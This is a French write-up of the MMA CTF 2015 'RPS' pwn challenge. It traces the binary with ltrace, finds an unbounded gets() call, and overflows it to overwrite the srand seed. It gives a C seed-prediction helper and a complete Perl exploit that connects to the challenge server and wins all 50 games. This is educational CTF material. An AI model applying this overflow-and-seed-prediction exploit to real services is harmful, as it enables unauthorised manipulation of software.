Title: [MMA 2015] RPS (pwn 50)
Date: 2015-09-08
Tags: ctf,exploit
Author: Tosh
Summary: MMA CTF write-up

Voici un petit write-up pour le challenge RPS, du CTF MMA 2015.




### **Analyse**

```
    $ file rps
    rps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8811962c746e1d068a5fa5b4deb7cb043c30146f, not stripped
```

On a donc un ELF 64 bits.

On comprends assez vite que le but du jeu est de gagner 50 parties de 'Pierre-Feuille-Ciseaux'.

On lance le binaire avec ltrace pour voir un peu ce qu'il fait :

```
    [pid 2942] __libc_start_main(0x400806, 1, 0x7ffea3e43a48, 0x400af0 <unfinished ...>
    [pid 2942] fopen("/dev/urandom", "r")                                                                                 = 0x2524010
    [pid 2942] fread(0x7ffea3e43940, 4, 1, 0x2524010)                                                                     = 1
    [pid 2942] fclose(0x2524010)                                                                                          = 0
    [pid 2942] printf("What's your name: ")                                                                               = 18
    [pid 2942] fflush(0x7fa5ca0cf640What's your name: )                                                                                     = 0
    [pid 2942] gets(0x7ffea3e43910, 0x7fa5ca0d07a0, 0, 0x7fa5c9e0c1b01234
    )                                                    = 0x7ffea3e43910
    [pid 2942] printf("Hi, %s\n", "1234"Hi, 1234
    )                                                                                 = 9
    [pid 2942] puts("Let's janken"Let's janken
    )                                                                                       = 13
    [pid 2942] fflush(0x7fa5ca0cf640)                                                                                     = 0
    [pid 2942] srand(0xe6503873, 0x7fa5ca0d07a0, 0, 0x7fa5c9e0c1b0)                                                       = 0
    [pid 2942] printf("Game %d/50\n", 1Game 1/50
    )                                                                                  = 10
    [pid 2942] printf("Rock? Paper? Scissors? [RPS]")                                                                     = 28
    [pid 2942] fflush(0x7fa5ca0cf640Rock? Paper? Scissors? [RPS])                                                                                     = 0
    [pid 2942] getchar(0, 0x7fa5ca0d07a0, 0, 0x7fa5c9e0c1b
```

Chose intéressante ici, une entrée est demandée avec la fonction gets(), qui ne s'occupe pas de vérifier la taille des données reçues.




### **Exploitation**

Voyons ce qu'il se passe lorsque l'on envoit une grande chaine de caractères :


```
    $ perl -e 'print "A"x500;' | ltrace -f ./rps
    ...
    [pid 2992] srand(0x41414141, 0x7f263277f7a0, 0, 0x7f26324bb1b0)
    ...

```

On arrive à écraser la valeur de la graine utilisée par la fonction srand(), ce qui permet de prédire très facilement les nombres générés par la fonction rand() par la suite.


Pour réaliser ceci, j'ai créer un petit programme (get_random) permettant de prédire le nième nombre généré par rand(), lorsque la graine est 0x41414141.


```C
    #include <stdio.h>
    #include <stdlib.h>


    int main(int argc, char **argv) {
      int i;
      int n;

      srand(0x41414141);

      for(i = 1; i <= atoi(argv[1]); i++)
        n = rand();

      printf("%d\n", n);

      return 0;
    }
```

Ensuite, on peut remarquer rapidement qu'un simple modulo sur le nombre aléatoire permet de déterminer quel "coup" choisir.


L'exploit complet :

```
    #!/usr/bin/perl

    use strict;
    use warnings;
    use IO::Socket::INET;

    my $sock = IO::Socket::INET->new(PeerAddr => 'milkyway.chal.mmactf.link',
                              PeerPort => 1641,
                              Proto => 'tcp') || die $@;

    print $sock "A"x100 . "\n";

    sleep(1);

    for(my $i = 1; $i <= 50; $i++) {
        my ($num) = `./get_random $i`;

        if(($num % 3) == 2) {
            print $sock "R\n";
        } elsif(($num % 3) == 0) {
            print $sock "P\n";
        } else {
            print $sock "S\n";
        }
    }

    print while(<$sock>);
```

Une fois les 50 parties gagnées, le flag nous est envoyé !
